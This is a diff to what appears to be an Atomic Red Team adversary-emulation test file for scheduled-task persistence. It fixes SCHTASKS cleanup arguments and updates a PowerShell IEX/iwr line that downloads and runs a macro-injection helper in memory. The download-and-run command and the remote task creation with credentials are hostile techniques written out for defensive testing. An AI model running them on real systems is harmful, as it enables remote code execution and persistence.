@@ -77,7 +77,7 @@ atomic_tests:
     command: |
       SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN "Atomic task" /TR "#{task_command}" /SC daily /ST #{time}
     cleanup_command: |
-      SCHTASKS /Delete /S #{target} /RU #{user_name} /RP #{password} /TN "Atomic task" /F >nul 2>&1
+      SCHTASKS /Delete /S #{target} /U #{user_name} /P #{password} /TN "Atomic task" /F >nul 2>&1
 
 - name: Powershell Cmdlet Scheduled Task
   auto_generated_guid: af9fd58f-c4ac-4bf2-a9ba-224b71ff25fd
@@ -127,7 +127,8 @@ atomic_tests:
       Write-Host "You will need to install Microsoft #{ms_product} manually to meet this requirement"
   executor:
     command: |
-      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1" -UseBasicParsing) 
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing) 
       Invoke-MalDoc -macroFile "PathToAtomicsFolder\T1053.005\src\T1053.005-macrocode.txt" -officeProduct "#{ms_product}" -sub "Scheduler"
     name: powershell
 - name: WMI Invoke-CimMethod Scheduled Task
